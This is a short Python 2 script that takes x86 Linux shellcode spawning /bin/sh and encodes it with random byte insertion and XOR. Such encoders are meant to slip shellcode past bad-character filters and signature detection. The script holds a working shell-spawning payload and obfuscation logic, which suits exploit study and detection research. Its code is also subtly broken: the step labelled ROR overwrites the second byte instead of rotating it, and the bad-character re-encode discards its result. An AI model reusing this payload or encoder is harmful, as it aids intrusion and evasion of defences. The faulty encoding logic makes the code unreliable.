'Random Byte Insertion + Xor + ROR'
#!/bin/python
from random import randint


payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode = bytearray()
shellcode.extend(payload)

# get length of shellcode
len_shellcode = len(shellcode)

# if the shellcode length is odd append nop
if len_shellcode % 2 == 1:
    shellcode.append("\x90")

bad_chars = ["\x00"]

def encoder():
    # Generate Encoded Shellcode
    encode_shellcode = bytearray()
    # range(start=0, stop=len_shellcode, step=2) step=2 skips over bytes
    for i in range(0, len_shellcode, 2):
        # generate random insertion bytes
        x = randint(1, 255)
        # Move first byte
        byte_1 = shellcode[i]
        # Move Second Byte
        byte_2 = shellcode[i+1]
        # Xor first byte
        byte_1 = (x ^ byte_1)
        # ROR second byte
        byte_2 = (byte_1%(x+7))

        # Build Encoded Shellcode
        encode_shellcode.append(x)
        encode_shellcode.append(byte_1)
        encode_shellcode.append(byte_2)
        for i in bad_chars:
            if encode_shellcode.find(i) >= 0:
                print("Illegal Char found , re-encoding wait :)")
                encoder()

    return encode_shellcode


encoded_bytes = ""
encoded_shellcode = encoder()
for y in encoded_shellcode:
    len_enc = len(str(hex(y)))
    if len_enc == 3:
        encoded_bytes += str(hex(y)[:2])+"0"+str(hex(y)[2:])+","
    else:
        encoded_bytes += str(hex(y))+","

encoded_=encoded_bytes[:-1]
print "[*] Size of original shellcode is: "+str(len(shellcode))
print "[*] Size of encoded shellcode is: "+str(len(encoded_shellcode))
print encoded_bytes
